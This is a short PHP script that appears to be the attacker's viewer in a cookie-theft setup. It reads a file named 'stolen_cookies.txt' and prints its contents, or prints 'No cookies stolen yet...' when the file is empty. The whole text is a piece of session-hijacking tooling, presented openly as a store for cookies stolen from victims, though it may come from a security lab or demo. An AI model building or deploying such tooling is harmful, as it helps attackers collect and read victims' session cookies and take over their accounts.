<?php
        if (file_exists('stolen_cookies.txt') and filesize('stolen_cookies.txt') > 0) {
            echo htmlspecialchars(file_get_contents('stolen_cookies.txt'));
        } elseif (file_get_contents('stolen_cookies.txt') === '') {
            echo "No cookies stolen yet...";
        } else {
            echo "Log file not found.";
        }
?>